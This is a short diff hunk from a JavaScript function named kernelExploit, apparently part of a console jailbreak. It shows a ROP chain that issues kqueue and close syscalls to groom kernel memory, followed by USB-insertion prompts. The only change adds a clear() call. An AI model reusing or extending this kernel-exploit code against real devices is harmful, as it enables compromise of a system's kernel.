@@ -692,7 +692,7 @@ function kernelExploit() {
   for (var i = 0; i < NUM_KQUEUES; i++) chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
   for (var i = 18; i < NUM_KQUEUES; i += 2) chain.fcall(window.syscalls[6], kqueues[i]);
   chain.run(); 
-
+   clear();
   msgs.innerHTML="1. Insert USB Then Remove It After The Notification Has Gone.<br>2. Press X After You Have Removed The USB";
   
   return new Promise((resolve, reject) => {
